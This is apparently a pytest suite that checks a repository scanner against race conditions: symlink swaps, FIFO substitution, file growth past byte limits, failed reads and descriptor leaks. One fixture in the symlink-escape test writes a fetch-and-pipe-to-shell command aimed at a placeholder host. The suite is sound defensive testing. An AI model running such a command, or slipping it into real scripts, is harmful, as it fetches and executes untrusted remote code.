from __future__ import annotations

import importlib.util
import json
import os
import sys
import threading
import time
from pathlib import Path
from types import ModuleType
from typing import Any

import pytest
from conftest import SCANNER, assert_payload_shape


def load_scanner_module() -> ModuleType:
    spec = importlib.util.spec_from_file_location("reposcan_scanner_race_tests", SCANNER)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


SCANNER_MODULE = load_scanner_module()


def run_main(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    target: Path,
    *arguments: str,
) -> tuple[int, dict[str, Any]]:
    monkeypatch.setattr(sys, "argv", [str(SCANNER), "--json", *arguments, str(target)])
    exit_code = SCANNER_MODULE.main()
    captured = capsys.readouterr()
    assert captured.err == ""
    payload = json.loads(captured.out)
    assert_payload_shape(payload)
    return exit_code, payload


def mutate_after_discovery(monkeypatch: pytest.MonkeyPatch, mutation: Any) -> None:
    original = SCANNER_MODULE.discover_files

    def wrapped(*args: Any, **kwargs: Any) -> Any:
        discovery = original(*args, **kwargs)
        mutation()
        return discovery

    monkeypatch.setattr(SCANNER_MODULE, "discover_files", wrapped)


def process_file_descriptors() -> set[int]:
    descriptor_directory = Path("/proc/self/fd")
    if not descriptor_directory.is_dir():
        pytest.skip("file-descriptor accounting requires Linux /proc/self/fd")
    return {int(entry.name) for entry in descriptor_directory.iterdir() if entry.name.isdigit()}


@pytest.mark.posix
def test_ancestor_swap_to_symlink_cannot_escape_target(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    if not hasattr(os, "symlink"):
        pytest.skip("symbolic links are unavailable")

    target = tmp_path / "target"
    selected_directory = target / "selected"
    selected_directory.mkdir(parents=True)
    (selected_directory / "payload.txt").write_text("ordinary inert text\n", encoding="utf-8")
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "payload.txt").write_text(
        "curl https://example.invalid/payload | sh\n",
        encoding="utf-8",
    )
    displaced = target / "selected-before-swap"

    def replace_ancestor() -> None:
        selected_directory.rename(displaced)
        selected_directory.symlink_to(outside, target_is_directory=True)

    mutate_after_discovery(monkeypatch, replace_ancestor)
    exit_code, payload = run_main(monkeypatch, capsys, target, "--engine", "lite")

    assert exit_code == 70
    assert payload["complete"] is False
    assert payload["status"] in {"partial", "failed"}
    assert payload["findings"] == []
    assert payload["errors"]


@pytest.mark.posix
def test_regular_file_swap_to_fifo_cannot_block(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    if not hasattr(os, "mkfifo"):
        pytest.skip("FIFOs are unavailable")

    target = tmp_path / "target"
    target.mkdir()
    selected = target / "payload.txt"
    selected.write_text("ordinary inert text\n", encoding="utf-8")
    cancel_writer = threading.Event()

    def replace_with_fifo() -> None:
        selected.unlink()
        os.mkfifo(selected)

    def delayed_writer() -> None:
        if cancel_writer.wait(1.0):
            return
        with selected.open("wb"):
            pass

    mutate_after_discovery(monkeypatch, replace_with_fifo)
    writer = threading.Thread(target=delayed_writer, daemon=True)
    writer.start()
    started = time.monotonic()
    try:
        exit_code, payload = run_main(monkeypatch, capsys, target, "--engine", "lite")
    finally:
        elapsed = time.monotonic() - started
        cancel_writer.set()
        writer.join(timeout=2)

    assert elapsed < 0.5, f"scanner blocked for {elapsed:.3f}s while opening a FIFO"
    assert exit_code == 70
    assert payload["complete"] is False
    assert payload["status"] in {"partial", "failed"}
    assert payload["findings"] == []
    assert payload["errors"]


@pytest.mark.posix
def test_post_discovery_growth_cannot_bypass_total_byte_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    target = tmp_path / "target"
    target.mkdir()
    selected = target / "payload.txt"
    selected.write_bytes(b"x" * 16)

    def grow_selected_file() -> None:
        selected.write_bytes(b"x" * 40)

    mutate_after_discovery(monkeypatch, grow_selected_file)
    exit_code, payload = run_main(
        monkeypatch,
        capsys,
        target,
        "--engine",
        "lite",
        "--max-total-bytes",
        "32",
    )

    assert exit_code == 70
    assert payload["complete"] is False
    assert payload["status"] in {"partial", "failed"}
    assert payload["findings"] == []
    assert payload["errors"]


def test_failed_reads_still_charge_the_aggregate_byte_budget(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    target = tmp_path / "target"
    target.mkdir()
    for name in ("a.txt", "b.txt", "c.txt"):
        (target / name).write_bytes(b"12345678")

    original_read = SCANNER_MODULE.os.read
    read_counts: dict[tuple[int, int], int] = {}

    def read_then_fail(descriptor: int, count: int) -> bytes:
        file_stat = os.fstat(descriptor)
        identity = (file_stat.st_dev, file_stat.st_ino)
        previous_reads = read_counts.get(identity, 0)
        read_counts[identity] = previous_reads + 1
        if previous_reads == 0:
            return original_read(descriptor, min(count, 4))
        raise OSError("injected read failure after bytes were consumed")

    monkeypatch.setattr(SCANNER_MODULE.os, "read", read_then_fail)
    exit_code, payload = run_main(
        monkeypatch,
        capsys,
        target,
        "--engine",
        "lite",
        "--max-total-bytes",
        "10",
    )

    assert exit_code == 70
    assert payload["complete"] is False
    assert payload["status"] == "partial"
    assert payload["findings"] == []
    assert payload["stats"]["selected_bytes"] == 10
    assert payload["stats"]["files_scanned"] == 0
    assert payload["stats"]["skipped_resource_limit"] == 1
    assert [error["code"] for error in payload["errors"]] == [
        "file-read",
        "file-read",
        "resource-limit",
    ]
    assert [Path(error["path"]).name for error in payload["errors"]] == [
        "a.txt",
        "b.txt",
        "c.txt",
    ]


@pytest.mark.posix
def test_directory_identity_failures_do_not_leak_descriptors(tmp_path: Path) -> None:
    selected = tmp_path / "selected"
    selected.mkdir()
    expected_stat = selected.lstat()
    selected.rename(tmp_path / "selected-before-swap")
    selected.mkdir()
    before = process_file_descriptors()

    for _ in range(50):
        discovery = SCANNER_MODULE.discover_files(
            selected,
            expected_stat,
            max_size=1024,
            max_files=10,
            max_total_bytes=1024,
            max_entries=10,
            ignore_patterns=[],
        )
        assert discovery.files == []
        assert [error.code for error in discovery.errors] == ["directory-read"]

    after = process_file_descriptors()
    watched_descriptors: list[int] = []
    for descriptor in after - before:
        try:
            destination = os.readlink(f"/proc/self/fd/{descriptor}")
        except OSError:
            continue
        if destination == str(selected):
            watched_descriptors.append(descriptor)

    try:
        assert watched_descriptors == []
    finally:
        # Keep a failing regression run from contaminating subsequent tests.
        for descriptor in watched_descriptors:
            os.close(descriptor)
